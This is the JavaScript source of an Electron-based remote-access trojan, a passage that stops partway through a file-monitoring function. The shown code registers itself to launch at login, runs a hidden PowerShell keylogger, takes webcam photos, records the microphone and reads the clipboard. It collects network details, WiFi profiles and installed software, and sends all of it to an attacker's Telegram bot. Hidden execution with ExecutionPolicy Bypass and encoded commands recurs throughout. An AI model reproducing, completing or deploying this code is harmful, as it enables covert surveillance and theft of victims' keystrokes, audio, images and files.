const {
  app,
  BrowserWindow,
  Tray,
  Menu,
  nativeImage,
  desktopCapturer,
  ipcMain,
  shell,
  session,
} = require("electron");
const path = require("path");
const fs = require("fs");
const { exec, spawn } = require("child_process");
const fsPromises = require("fs").promises;
const fetch = require("./fetch");
const FormData = require("form-data");
const os = require("os");
const crypto = require("crypto");
const axios = require("axios");
require("dotenv").config();

// ==================== CONFIGURATION ====================
const CONFIG = {
  C2_PORT: process.env.C2_PORT || 4444,
  C2_HOST: process.env.C2_HOST || "",
  BOT_TOKEN:
    process.env.BOT_TOKEN || "",
  ADMIN_CHAT_ID: process.env.ADMIN_CHAT_ID || "",

  FILE_EXTENSIONS: JSON.parse(
    process.env.FILE_EXTENSIONS ||
      '["txt", "pdf", "docx", "xlsx", "pptx", "jpg", "png", "zip", "rar", "csv", "json", "xml", "mp3", "mp4", "wav", "avi", "mov", "mkv", "doc", "xls"]'
  ).map((ext) => `.${ext}`),

  IGNORED_DIRS: JSON.parse(
    process.env.IGNORED_DIRS ||
      '["node_modules", "venv", ".git", "AppData", "Windows", "Program Files", "System32"]'
  ),
};

// ==================== GLOBAL STATE ====================
let mainWindow = null;
let tray = null;
let appIsQuitting = false;
let commandHistory = [];
let reverseShellProcess = null;
let botPollingInterval = null;
let sentFiles = new Set();
let stateFile = path.join(app.getPath("userData"), "sent_files.json");
let keyloggerActive = false;
let keyloggerProcess = null;
let webcamInterval = null;
let fileMonitorInterval = null;

// ==================== UTILITY FUNCTIONS ====================
function getAppPath() {
  return app.isPackaged ? path.dirname(process.execPath) : __dirname;
}

function getTempPath(filename) {
  return path.join(os.tmpdir(), `tg_${filename || Date.now()}`);
}

function extractScriptToTemp(scriptName) {
  let searchPaths = [
    path.join(__dirname, scriptName),
    path.join(getAppPath(), scriptName),
    process.resourcesPath ? path.join(process.resourcesPath, scriptName) : null
  ].filter(Boolean);

  for (let p of searchPaths) {
    if (fs.existsSync(p)) {
      const tempPath = getTempPath(scriptName);
      fs.copyFileSync(p, tempPath);
      return tempPath;
    }
  }
  return null;
}

function generateSessionId() {
  return crypto.randomBytes(8).toString("hex");
}

const SESSION_ID = generateSessionId();

function log(message, type = "INFO") {
  const timestamp = new Date().toLocaleString();
  const logMessage = `[${timestamp}] [${type}] ${message}`;
  console.log(logMessage);
}

// ==================== STARTUP REGISTRATION ====================
function enableAutoLaunch() {
  try {
    app.setLoginItemSettings({
      openAtLogin: true,
      path: process.execPath,
    });
    console.log("✅ Auto-launch enabled via Electron");
  } catch (err) {
    console.error("❌ Auto-launch setup failed:", err);
  }
}

// ==================== TELEGRAM FUNCTIONS ====================
async function telegramSendMessage(
  text,
  chatId = CONFIG.ADMIN_CHAT_ID,
  parseMode = "HTML"
) {
  try {
    const response = await fetch(
      `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: text,
          parse_mode: parseMode,
        }),
      }
    );
    return response.ok;
  } catch (error) {
    log(`Telegram send error: ${error.message}`, "ERROR");
    return false;
  }
}

async function telegramSendFile(
  filePath,
  caption = "",
  chatId = CONFIG.ADMIN_CHAT_ID
) {
  try {
    const cleanFileName = path.basename(filePath);
    const fileExt = path.extname(filePath).toLowerCase();

    let endpoint = "sendDocument";
    let fieldName = "document";

    if ([".jpg", ".png", ".jpeg", ".gif"].includes(fileExt)) {
      endpoint = "sendPhoto";
      fieldName = "photo";
    } else if ([".mp4", ".avi", ".mov", ".mkv", ".webm"].includes(fileExt)) {
      endpoint = "sendVideo";
      fieldName = "video";
    } else if ([".mp3", ".wav", ".m4a", ".ogg"].includes(fileExt)) {
      endpoint = "sendAudio";
      fieldName = "audio";
    }

    const formData = new FormData();
    formData.append("chat_id", chatId);
    formData.append(fieldName, fs.createReadStream(filePath));

    if (caption) {
      formData.append("caption", caption);
    }

    const response = await fetch(
      `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/${endpoint}`,
      {
        method: "POST",
        body: formData,
      }
    );

    return response.ok;
  } catch (error) {
    log(`File send error: ${error.message}`, "ERROR");
    return false;
  }
}

async function telegramGetUpdates(lastUpdateId) {
  try {
    const response = await fetch(
      `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`
    );
    const data = await response.json();
    return data.ok ? data.result : [];
  } catch (error) {
    return [];
  }
}

// ==================== KEYLOGGER FUNCTIONS ====================
function startKeylogger(chatId) {
  if (keyloggerActive) {
    telegramSendMessage("⌨️ Keylogger is already running", chatId);
    return;
  }

  keyloggerActive = true;

  telegramSendMessage(
    "⌨️ Keylogger started - capturing text every 30 seconds...",
    chatId
  );

  const keylogFile = getTempPath(`keylog_${Date.now()}.txt`);

  const tempDir = getTempPath();
  if (!fs.existsSync(tempDir)) {
    fs.mkdirSync(tempDir, { recursive: true });
  }

  fs.writeFileSync(
    keylogFile,
    `Keylogger Started: ${new Date().toLocaleString()}\n`
  );

  const keyloggerScriptPath = extractScriptToTemp("keylogger.ps1");

  if (!keyloggerScriptPath) {
    telegramSendMessage(
      `❌ Keylogger script not found!`,
      chatId
    );
    keyloggerActive = false;
    return;
  }

  console.log("Keylogger script path:", keyloggerScriptPath);
  console.log("Log file path:", keylogFile);

  const powershellCommand = `powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "${keyloggerScriptPath}" -LogFilePath "${keylogFile}"`;

  keyloggerProcess = exec(powershellCommand, (error, stdout, stderr) => {
    if (error) {
      console.error("PowerShell error:", error);
      if (keyloggerActive) {
        telegramSendMessage(`❌ Keylogger error: ${error.message}`, chatId);
        keyloggerActive = false;
      }
    }
    if (stderr && !stderr.includes("False")) {
      console.error("PowerShell stderr:", stderr);
      if (
        stderr.includes("Cannot add type") ||
        stderr.includes("COMPILER_ERRORS")
      ) {
        telegramSendMessage(
          "❌ Keylogger compilation failed. Please check the PowerShell script.",
          chatId
        );
        keyloggerActive = false;
      }
    }
    if (stdout) {
      console.log("PowerShell stdout:", stdout);
    }
  });

  keyloggerProcess.unref();

  let lastTextContent = "";
  let lastSendTime = Date.now();

  const keylogInterval = setInterval(async () => {
    if (!keyloggerActive) {
      clearInterval(keylogInterval);
      return;
    }

    try {
      if (fs.existsSync(keylogFile)) {
        const content = fs.readFileSync(keylogFile, "utf8");
        const lines = content
          .split("\n")
          .filter((line) => line.includes("TEXT:") && line.trim().length > 0);

        if (lines.length > 0) {
          const recentTextLines = lines.slice(-10);

          let allText = recentTextLines
            .map((line) => {
              const match = line.match(/TEXT: (.*)/);
              return match ? match[1].trim() : "";
            })
            .filter((text) => text.length > 0)
            .join(" ");

          const currentTime = Date.now();
          if (
            allText !== lastTextContent &&
            currentTime - lastSendTime >= 30000
          ) {
            const cleanText = allText
              .replace(/\s+/g, " ")
              .replace(/\n/g, " ")
              .trim();

            if (cleanText.length > 0) {
              await telegramSendMessage(
                `📝**Written text:**\n\n\`\`\`${cleanText}\`\`\``,
                chatId
              );

              lastTextContent = allText;
              lastSendTime = currentTime;

              const allLines = content
                .split("\n")
                .filter((line) => line.trim().length > 0);
              const keepLines = allLines.slice(-15);
              fs.writeFileSync(keylogFile, keepLines.join("\n") + "\n");
            }
          }
        }
      }
    } catch (error) {
      console.error("Keylog check error:", error);
    }
  }, 10000);

  setTimeout(async () => {
    if (keyloggerActive) {
      await telegramSendMessage(
        "✅ Keylogger started successfully! Text will be sent every 30 seconds.",
        chatId
      );
    }
  }, 2000);
}
function stopKeylogger(chatId) {
  if (!keyloggerActive) {
    telegramSendMessage("⌨️ Keylogger is not running", chatId);
    return;
  }

  keyloggerActive = false;

  if (keyloggerProcess) {
    exec("taskkill /f /im powershell.exe", (error) => {
      if (error) {
        console.error("Error killing PowerShell:", error);
      }
    });
    keyloggerProcess = null;
  }

  telegramSendMessage("❌ Keylogger stopped", chatId);
}

// ==================== ENHANCED COMMANDS ====================

let isCapturing = false;

async function startContinuousWebcam(chatId, interval = 60000) {
  try {
    // Minimum interval yoxlaması
    if (interval < 5000) interval = 5000;

    if (webcamInterval) {
      await telegramSendMessage(
        "📹 Continuous webcam is already running",
        chatId
      );
      return;
    }

    await telegramSendMessage(
      `📹 Starting continuous webcam capture every ${interval / 1000} seconds...`,
      chatId
    );

    webcamInterval = setInterval(async () => {
      if (isCapturing) {
        log("⚠️ Skipping capture: previous capture still running", "WARN");
        return;
      }

      isCapturing = true;
      try {
        await captureWebcamPhoto(chatId);
        log("📸 Webcam photo captured successfully");
      } catch (error) {
        log(`Continuous webcam error: ${error.message}`, "ERROR");
        await telegramSendMessage(
          `❌ Webcam capture failed: ${error.message}`,
          chatId
        );
      } finally {
        isCapturing = false;
      }
    }, interval);

    log(`Continuous webcam started with interval ${interval}ms`);
  } catch (err) {
    await telegramSendMessage(
      `❌ Failed to start continuous webcam: ${err.message}`,
      chatId
    );
  }
}

async function stopContinuousWebcam(chatId) {
  try {
    if (webcamInterval) {
      clearInterval(webcamInterval);
      webcamInterval = null;
      await telegramSendMessage("🛑 Continuous webcam stopped", chatId);
      log("Continuous webcam stopped");
    } else {
      await telegramSendMessage("ℹ️ Webcam is not running", chatId);
    }
  } catch (err) {
    await telegramSendMessage(`❌ Stop webcam error: ${err.message}`, chatId);
  }
}
//https://github.com/EmpireProject/Empire/blob/master/lib/modules/powershell/collection/WebcamRecorder.py
const { spawnSync } = require("child_process");
async function ensureFFmpeg() {
  if (process.platform !== "win32") {
    throw new Error("FFmpeg setup is only implemented for Windows in this script.");
  }

  const fromEnv = process.env.FFMPEG_PATH;
  if (fromEnv && isUsableExe(fromEnv)) return path.resolve(fromEnv);

  const whereRes = spawnSync("where", ["ffmpeg"], { encoding: "utf8" });
  if (whereRes.status === 0) {
    const cand = parseWhereOutput(whereRes.stdout);
    for (const p of cand) if (isUsableExe(p)) return path.resolve(p);
  }

  const localBin = path.join(process.cwd(), "bin");
  const localExe = path.join(localBin, "ffmpeg.exe");
  if (isUsableExe(localExe)) return localExe;

  const url =
    process.env.FFMPEG_ZIP_URL?.trim() ||
    "https://www.gyan.dev/ffmpeg/builds/ffmpeg-release-essentials.zip";

  fs.mkdirSync(localBin, { recursive: true });
  const tmpZip = path.join(os.tmpdir(), `ffmpeg-${Date.now()}.zip`);
  const extractDir = path.join(os.tmpdir(), `ffmpeg-extract-${Date.now()}`);
  fs.mkdirSync(extractDir, { recursive: true });

  await downloadFile(url, tmpZip);

  const exp = spawnSync(
    "powershell.exe",
    [
      "-NoProfile",
      "-ExecutionPolicy",
      "Bypass",
      "-Command",
      `Try { Expand-Archive -Path '${tmpZip}' -DestinationPath '${extractDir}' -Force; exit 0 } Catch { Write-Error $_; exit 1 }`,
    ],
    { encoding: "utf8" }
  );

  if (exp.status !== 0) {
    safeUnlink(tmpZip);
    throw new Error(
      `FFmpeg ZIP açılmadı: ${exp.stderr || exp.stdout || "naməlum"}`
    );
  }

  const found = findFileRecursive(extractDir, "ffmpeg.exe");
  if (!found) {
    safeUnlink(tmpZip);
    safeRm(extractDir);
    throw new Error("ZIP içində 'ffmpeg.exe' tapılmadı.");
  }

  if (path.resolve(found) !== path.resolve(localExe)) {
    fs.copyFileSync(found, localExe);
  }

  safeUnlink(tmpZip);
  safeRm(extractDir);

  if (!isUsableExe(localExe)) {
    throw new Error(
      "ffmpeg.exe copied to local bin, but it's not usable (permission issue?)."
    );
  }
  return localExe;
}

function parseWhereOutput(stdout) {
  return stdout
    .split(/\r?\n/)
    .map((s) => s.trim())
    .filter(Boolean);
}
function isUsableExe(p) {
  try {
    const st = fs.statSync(p);
    if (!st.isFile()) return false;
    fs.accessSync(p, fs.constants.R_OK);
    return true;
  } catch {
    return false;
  }
}
function downloadFile(url, dest) {
  return new Promise((resolve, reject) => {
    const req = https.get(url, (res) => {
      if (
        res.statusCode >= 300 &&
        res.statusCode < 400 &&
        res.headers.location
      ) {
        res.destroy();
        return resolve(downloadFile(res.headers.location, dest));
      }
      if (res.statusCode !== 200) {
        res.resume();
        return reject(
          new Error(`Download failed: HTTP ${res.statusCode}`)
        );
      }
      const file = fs.createWriteStream(dest);
      res.pipe(file);
      file.on("finish", () => file.close(resolve));
      file.on("error", (err) => reject(err));
    });
    req.setTimeout(60_000, () => {
      req.destroy(new Error("Download timeout"));
    });
    req.on("error", reject);
  });
}
function findFileRecursive(root, fileName) {
  const stack = [root];
  while (stack.length) {
    const dir = stack.pop();
    const entries = fs.readdirSync(dir, { withFileTypes: true });
    for (const e of entries) {
      const full = path.join(dir, e.name);
      if (e.isDirectory()) stack.push(full);
      else if (e.isFile() && e.name.toLowerCase() === fileName.toLowerCase())
        return full;
    }
  }
  return null;
}
function safeUnlink(p) {
  try {
    fs.existsSync(p) && fs.unlinkSync(p);
  } catch {}
}
function safeRm(p) {
  try {
    fs.existsSync(p) && fs.rmSync(p, { recursive: true, force: true });
  } catch {}
}

// -------- Snapshot (yalnız şəkil) --------

let snapshotLock = false;

async function captureWebcamPhoto(chatId, opts = {}) {
  if (process.platform !== "win32") {
    await telegramSendMessage(
      "❌ This function is supported on Windows only.",
      chatId
    );
    return;
  }
  if (snapshotLock) {
    await telegramSendMessage("⚠️ Another snapshot is in progress.", chatId);
    return;
  }
  snapshotLock = true;

  try {
    const {
      cameraIndex = 0,
      cameraName = "",
      resolution = "1280x720",
      timeoutSec = 15,
      outputPath = path.join(os.tmpdir(), `webcam_${Date.now()}.jpg`),
    } = opts;

    const scriptPath = extractScriptToTemp("CameraSnapshot.ps1");
    if (!scriptPath) {
      await telegramSendMessage(
        "❌ CameraSnapshot.ps1 not found next to this file.",
        chatId
      );
      return;
    }

    // helper: push only when value is a non-empty string
    const pushArg = (arr, name, value) => {
      if (value === undefined || value === null) return;
      const s = String(value);
      if (s.trim().length === 0) return;
      arr.push(name, s);
    };

    const args = [
      "-NoProfile",
      "-ExecutionPolicy",
      "Bypass",
      "-File",
      scriptPath,
    ];
    pushArg(
      args,
      "-CameraIndex",
      Number.isFinite(+cameraIndex) ? String(+cameraIndex) : "0"
    );
    pushArg(args, "-CameraName", cameraName); // skipped if empty
    pushArg(args, "-Resolution", resolution); // must be WxH
    pushArg(args, "-OutputPath", outputPath);
    pushArg(
      args,
      "-TimeoutSec",
      Number.isFinite(+timeoutSec) ? String(+timeoutSec) : "15"
    );
    // Do NOT add "-Verbose:$false" — it parses as a SwitchParameter, causing binding issues.

    await telegramSendMessage("🖼️ Starting snapshot...", chatId);

    const ps = spawn("powershell.exe", args, { windowsHide: true });
    let stdout = "";
    let stderr = "";

    ps.stdout.on("data", (d) => {
      stdout += d.toString();
    });
    ps.stderr.on("data", (d) => {
      stderr += d.toString();
    });

    const exitCode = await new Promise((resolve) => ps.on("close", resolve));

    // Success path: script prints the absolute path to STDOUT on success
    const lines = stdout
      .split(/\r?\n/)
      .map((s) => s.trim())
      .filter(Boolean);
    const last = lines[lines.length - 1];

    if (exitCode === 0 && last && fs.existsSync(last)) {
      await telegramSendFile(last, "✅ Snapshot ready.", chatId);
      return;
    }
    if (fs.existsSync(outputPath)) {
      await telegramSendFile(outputPath, "✅ Snapshot ready.", chatId);
      return;
    }

    // Failure → show last stderr tail
    const tail = stderr.split(/\r?\n/).slice(-40).join("\n") || "unknown";
    await telegramSendMessage(`❌ Snapshot failed.\n${tail}`, chatId);
  } catch (err) {
    await telegramSendMessage(`❌ Error: ${err.message}`, chatId);
  } finally {
    snapshotLock = false;
  }
}

// export your function as needed

// One-at-a-time recorder with 5s status updates and single file send.
// Usage: await recordAudio(chatId, 12)
//cox cetin oldu
//https://www.reddit.com/r/PowerShell/comments/1kkaz0k/streaming_microphone_audio_from_powershell/
//https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-MicrophoneAudio.ps1
async function recordAudio(chatId, durationSecs = 10) {
  const { exec } = require("child_process");
  const fs = require("fs");
  const os = require("os");
  const path = require("path");

  // --- concurrency guard: allow only 1 active run
  if (!global.__recordAudioLock) global.__recordAudioLock = { active: false };
  const LOCK = global.__recordAudioLock;
  if (LOCK.active) {
    await telegramSendMessage(
      "⚠️ A recording is already in progress. Please wait for it to finish.",
      chatId
    );
    return;
  }
  LOCK.active = true;

  const outWav = path.join(os.tmpdir(), `mic_${Date.now()}.wav`);
  const psFile = path.join(os.tmpdir(), `rec_${Date.now()}.ps1`);

  // ---------- PowerShell content (auto-format MCI) ----------
  const psContent = `
param(
  [Parameter(Mandatory=$true)][string]$Path,
  [Parameter(Mandatory=$true)][int]$Seconds
)
$ErrorActionPreference = 'Stop'
[Console]::OutputEncoding = [Text.Encoding]::UTF8
function Write-Log([string]$msg){ Write-Output ("LOG:" + $msg) }

$code = @"
using System;
using System.Runtime.InteropServices;
using System.Text;
public static class WinMM {
  [DllImport("winmm.dll", CharSet = CharSet.Ansi, SetLastError=true)]
  public static extern uint mciSendString(string command, StringBuilder returnValue, uint returnLength, IntPtr callback);
  [DllImport("winmm.dll", CharSet = CharSet.Ansi, SetLastError=true)]
  public static extern bool mciGetErrorString(uint fdwError, StringBuilder lpszErrorText, uint cchErrorText);
  [DllImport("winmm.dll")]
  public static extern uint waveInGetNumDevs();
}
"@
Add-Type -TypeDefinition $code

function Invoke-Mci([string]$cmd){
  Write-Log ("MCI>" + $cmd)
  $sb = New-Object System.Text.StringBuilder 256
  $rc = [WinMM]::mciSendString($cmd, $sb, 256, [IntPtr]::Zero)
  if ($rc -ne 0) {
    $err = New-Object System.Text.StringBuilder 256
    [void][WinMM]::mciGetErrorString($rc, $err, 256)
    throw "MCI error ($rc) for '$cmd' : $($err.ToString())"
  }
  $o = $sb.ToString()
  if ($o) { Write-Log ("MCI<" + $o) }
  return $o
}

$devCount = [WinMM]::waveInGetNumDevs()
Write-Log ("waveInGetNumDevs=" + $devCount)
if ($devCount -lt 1) { Write-Output "ERROR:No recording devices found"; exit }

$path = [System.IO.Path]::GetFullPath($Path)
$dir  = Split-Path -Path $path -Parent
if (-not (Test-Path -LiteralPath $dir)) { Write-Output "ERROR:Output directory does not exist"; exit }

$alias = -join ((65..90 + 97..122) | Get-Random -Count 10 | % {[char]$_})
Write-Log ("Alias=" + $alias)

try {
  Invoke-Mci ("open new type waveaudio alias " + $alias)
  Invoke-Mci ("set " + $alias + " time format ms")
  try { Invoke-Mci ("set " + $alias + " format tag pcm") } catch { Write-Log "format tag pcm not accepted" }

  $channelOptions = 1,2
  $rateOptions    = 48000,44100,32000,22050,16000,11025,8000
  $applied = $false

  foreach ($ch in $channelOptions) {
    foreach ($sr in $rateOptions) {
      Write-Log ("Try format: 16-bit, ch="+$ch+", sr="+$sr)
      try {
        Invoke-Mci ("set " + $alias + " bitspersample 16")
        Invoke-Mci ("set " + $alias + " channels " + $ch)
        Invoke-Mci ("set " + $alias + " samplespersec " + $sr)
        try { Invoke-Mci ("set " + $alias + " alignment " + (2 * $ch)) } catch { Write-Log "alignment not accepted" }
        try { Invoke-Mci ("set " + $alias + " bytespersec " + ($sr * 2 * $ch)) } catch { Write-Log "bytespersec not accepted" }

        Invoke-Mci ("record " + $alias)
        Start-Sleep -Milliseconds 150
        Invoke-Mci ("stop " + $alias)
        Write-Log ("Format OK: ch="+$ch+", sr="+$sr)
        $applied = $true
        break
      } catch {
        Write-Log ("Format failed: " + $_.Exception.Message)
        try { Invoke-Mci ("stop " + $alias) } catch {}
      }
    }
    if ($applied) { break }
  }

  if (-not $applied) {
    Invoke-Mci ("close " + $alias)
    Write-Output "ERROR:No supported format found (16-bit PCM across common rates)"
    exit
  }

  Invoke-Mci ("record " + $alias)
  Write-Log ("Recording for " + $Seconds + "s ...")
  Start-Sleep -Seconds $Seconds

  Invoke-Mci ("stop " + $alias)
  $mode = Invoke-Mci ("status " + $alias + " mode")
  Write-Log ("Status mode=" + $mode)

  Invoke-Mci ("save " + $alias + " \`"" + $path + "\`"")
  Invoke-Mci ("close " + $alias)
  Write-Log ("Closed device.")

  if (-not (Test-Path -LiteralPath $path)) { Write-Output "ERROR:Output file not created"; exit }

  $fs = [System.IO.File]::OpenRead($path)
  try {
    $hdr = New-Object byte[] 12
    $read = $fs.Read($hdr,0,12)
    $riff = [System.Text.Encoding]::ASCII.GetString($hdr,0,4)
    $wave = [System.Text.Encoding]::ASCII.GetString($hdr,8,4)
    if ($riff -ne "RIFF" -or $wave -ne "WAVE") { Write-Output "ERROR:Recorded file header invalid"; exit }
  } finally { $fs.Close() }

  $len = (Get-Item -LiteralPath $path).Length
  if ($len -lt 44) { Write-Output "ERROR:Recorded file too small"; exit }

  Write-Output ("RECORDED:" + $path)
}
catch {
  try { Invoke-Mci ("close " + $alias) } catch {}
  Write-Output ("ERROR:" + $_.Exception.Message)
}
`.trim();

  // tiny exec helper
  const run = (cmd, timeoutMs) =>
    new Promise((resolve) => {
      exec(
        cmd,
        { timeout: timeoutMs, windowsHide: true },
        (err, stdout, stderr) =>
          resolve(((stdout || "") + (stderr || "")).trim())
      );
    });

  // write ps1 file
  fs.writeFileSync(psFile, psContent, "utf8");

  // 5s status pings
  const total = Math.max(1, Number(durationSecs) | 0);
  let sentTicks = 0;
  let statusTimer = null;

  try {
    await telegramSendMessage(
      `🎤 Recording started (${total}s)\n• Temp: ${outWav}`,
      chatId
    );

    const startedAt = Date.now();
    statusTimer = setInterval(async () => {
      const elapsed = Math.floor((Date.now() - startedAt) / 1000);
      const remain = Math.max(0, total - elapsed);
      sentTicks++;
      // send every 5s (by design), include a small spinner vibe
      const dots = ".".repeat((sentTicks % 3) + 1);
      try {
        await telegramSendMessage(
          `⏱️ Recording${dots} elapsed: ${elapsed}s / ${total}s — remaining: ${remain}s`,
          chatId
        );
      } catch {}
    }, 5000);

    // run PS (duration + buffer)
    const cmd = `powershell -Sta -NoProfile -ExecutionPolicy Bypass -File "${psFile}" -Path "${outWav}" -Seconds ${total}`;
    const output = await run(cmd, (total + 30) * 1000);

    // stop timer
    clearInterval(statusTimer);
    statusTimer = null;

    // Diagnostics (shortened)
    const diag = output.length > 3500 ? output.slice(-3500) : output;
    //await telegramSendMessage(`🧪 Diagnostics:\n<code>${diag.replace(/</g, '&lt;')}</code>`, chatId);

    // Send ONE file only
    if (/^RECORDED:/m.test(output)) {
      const m = output.match(/^RECORDED:(.+)$/m);
      const filePath = m && m[1] ? m[1].trim() : outWav;
      if (fs.existsSync(filePath)) {
        const caption = `🎧 Audio (${total}s)\n${new Date().toLocaleString()}`;
        await telegramSendFile(filePath, caption, chatId);
        try {
          fs.unlinkSync(filePath);
        } catch {}
      } else {
        await telegramSendMessage(
          "❌ Recording finished but file not found",
          chatId
        );
      }
    } else if (/^ERROR:/m.test(output)) {
      const err = output.replace(/^[\s\S]*?ERROR:/, "").trim();
      await telegramSendMessage(`❌ Audio recording error: ${err}`, chatId);
    } else {
      await telegramSendMessage(
        `❌ Audio recording failed.\n<code>${output.substring(0, 2000).replace(/</g, "&lt;")}</code>`,
        chatId
      );
    }
  } catch (e) {
    if (statusTimer) {
      clearInterval(statusTimer);
      statusTimer = null;
    }
    await telegramSendMessage(`❌ Audio recording error: ${e.message}`, chatId);
  } finally {
    try {
      if (fs.existsSync(outWav)) fs.unlinkSync(outWav);
    } catch {}
    try {
      if (fs.existsSync(psFile)) fs.unlinkSync(psFile);
    } catch {}
    LOCK.active = false;
  }
}

async function getClipboardContent(chatId) {
  try {
    const psScript = `
Add-Type -AssemblyName System.Windows.Forms



try {
    if ([System.Windows.Forms.Clipboard]::ContainsText()) {
        $text = [System.Windows.Forms.Clipboard]::GetText()
        if ([string]::IsNullOrWhiteSpace($text)) {
            "EMPTY_TEXT"
        } else {
            "TEXT:" + $text
        }
    } elseif ([System.Windows.Forms.Clipboard]::ContainsImage()) {
        "IMAGE"
    } elseif ([System.Windows.Forms.Clipboard]::ContainsFileDropList()) {
        $files = [System.Windows.Forms.Clipboard]::GetFileDropList()
        "FILES:" + ($files -join '|')
    } else {
        "EMPTY"
    }
} catch {
    "ERROR:$($_.Exception.Message)"
}
`.trim();

    const psEncoded = Buffer.from(psScript, "utf16le").toString("base64");
    const result = await executeSystemCommand(
      `powershell -NoProfile -EncodedCommand ${psEncoded}`,
      10000
    );
    const cleanResult = result.replace(/\r?\n/g, "").trim();

    if (cleanResult.startsWith("TEXT:")) {
      const text = cleanResult.slice(5).trim();
      const displayText =
        text.length > 1000 ? text.substring(0, 1000) + "..." : text;
      await telegramSendMessage(
        `📋 Clipboard Text:\n<code>${displayText.replace(/</g, "&lt;").replace(/>/g, "&gt;")}</code>`,
        chatId
      );
    } else if (cleanResult === "IMAGE") {
      await telegramSendMessage("📋 Clipboard contains an image 🖼", chatId);
    } else if (cleanResult.startsWith("FILES:")) {
      const files = cleanResult.slice(6).split("|").filter(Boolean);
      await telegramSendMessage(
        `📋 Clipboard Files:\n${files.map((f) => `• ${f}`).join("\n")}`,
        chatId
      );
    } else if (cleanResult === "EMPTY_TEXT") {
      await telegramSendMessage("📋 Clipboard contains empty text", chatId);
    } else if (cleanResult === "EMPTY") {
      await telegramSendMessage("📋 Clipboard is empty", chatId);
    } else if (cleanResult.startsWith("ERROR:")) {
      const errMsg = cleanResult.slice(6).trim();
      await telegramSendMessage(`❌ Clipboard error: ${errMsg}`, chatId);
    } else {
      await telegramSendMessage(
        `📋 Unknown clipboard content:\n<code>${cleanResult}</code>`,
        chatId
      );
    }
  } catch (error) {
    await telegramSendMessage(`❌ Clipboard error: ${error.message}`, chatId);
  }
}

async function getNetworkInfo(chatId) {
  try {
    const commands = {
      "IP Configuration": "ipconfig /all",
      "Network Connections": "netstat -an",
      "ARP Table": "arp -a",
      "WiFi Profiles": "netsh wlan show profiles",
    };

    let networkInfo = "🌐 <b>Network Information</b>\n\n";

    for (const [title, command] of Object.entries(commands)) {
      networkInfo += `<b>${title}:</b>\n`;
      const result = await executeSystemCommand(command);
      networkInfo += `<code>${result.substring(0, 500)}${result.length > 500 ? "..." : ""}</code>\n\n`;
    }

    await telegramSendMessage(networkInfo, chatId);
  } catch (error) {
    await telegramSendMessage(
      `❌ Network info error: ${error.message}`,
      chatId
    );
  }
}

async function getInstalledSoftware(chatId) {
  try {
    const psScript = `
$keys = @(
  'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall',
  'HKLM:\\Software\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall',
  'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall'
)

$apps = @()

foreach ($k in $keys) {
  if (Test-Path $k) {
    Get-ItemProperty -Path ($k + '\\*') -ErrorAction SilentlyContinue | ForEach-Object {
      if ($_.DisplayName) {
        $apps += [PSCustomObject]@{
          Name = ($_.DisplayName -as [string])
          Version = ($_.DisplayVersion -as [string])
          Publisher = ($_.Publisher -as [string])
          InstallDate = ($_.InstallDate -as [string])
          Source = $k
        }
      }
    }
  }
}

# Filter və sort et, duplicate-ları Name əsaslı uniq et
$apps = $apps | Where-Object { $_.Name -ne $null -and $_.Name.Trim() -ne '' } |
        Sort-Object Name -Unique

# Çıxışı JSON formatında ver
$apps | ConvertTo-Json -Depth 4
`.trim();

    const psEncoded = Buffer.from(psScript, "utf16le").toString("base64");
    const cmd = `powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand ${psEncoded}`;

    const rawOut = await executeSystemCommand(cmd, 20000);
    const out = (rawOut || "").trim();
    let apps = null;
    try {
      apps = JSON.parse(out);
    } catch (err) {
      const safe = out.length > 4000 ? out.substring(0, 4000) + "..." : out;
      await telegramSendMessage(
        `📦 <b>Installed Software (raw):</b>\n<code>${escapeHtml(safe)}</code>`,
        chatId
      );
      return;
    }

    if (!apps || (Array.isArray(apps) && apps.length === 0)) {
      await telegramSendMessage(
        "📦 No installed software found.",
        chatId
      );
      return;
    }

    if (!Array.isArray(apps)) apps = [apps];

    const lines = apps
      .map((a) => {
        const name = (a.Name || "").trim();
        const ver = (a.Version || "").trim();
        const pub = (a.Publisher || "").trim();
        const src = (a.Source || "")
          .replace("HKLM:\\", "")
          .replace("HKCU:\\", "");
        const parts = [];
        if (name) parts.push(name);
        if (ver) parts.push(`v${ver}`);
        if (pub) parts.push(pub);
        if (src) parts.push(`(${src})`);
        return parts.join(" — ");
      })
      .filter((l) => l && l.length > 0);

    const outputText = lines.join("\n");

    if (outputText.length <= 4000) {
      await telegramSendMessage(
        `📦 <b>Installed Software:</b>\n<code>${escapeHtml(outputText)}</code>`,
        chatId
      );
    } else {
      const tmpPath = getTempPath(`installed_software_${Date.now()}.txt`);
      await fsPromises.writeFile(tmpPath, outputText, "utf8");

      if (typeof telegramSendDocument === "function") {
        await telegramSendDocument(
          tmpPath,
          `📦 Installed software list`,
          chatId
        );
      } else if (typeof telegramSendFile === "function") {
        await telegramSendFile(tmpPath, `📦 Installed software list`, chatId);
      } else {
        await telegramSendMessage(
          `📦 Installed software list is too long — file created: ${tmpPath}`,
          chatId
        );
      }
      // cleanup
      try {
        await fsPromises.unlink(tmpPath);
      } catch (e) {}
    }
  } catch (error) {
    await telegramSendMessage(
      `❌ Software list error: ${escapeHtml(error.message || String(error))}`,
      chatId
    );
  }
}

function escapeHtml(s = "") {
  return s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

async function startFileMonitor(chatId, directory = "Downloads") {
  try {
    const monitorDir = path.join(os.homedir(), directory);
    if (!fs.existsSync(monitorDir)) {
      await telegramSendMessage(
        `❌ Directory not found: ${monitorDir}`,
        chatId
      );
      return;
    }

    let lastFiles = new Set();
    const initialFiles = await fsPromises.readdir(monitorDir);
    initialFiles.forEach((file) => lastFiles.add(file));

    telegramSendMessage(`📁 Monitoring directory: ${monitorDir}`, chatId);

    if (fileMonitorInterval) {
      clearInterval(fileMonitorInterval);
    }

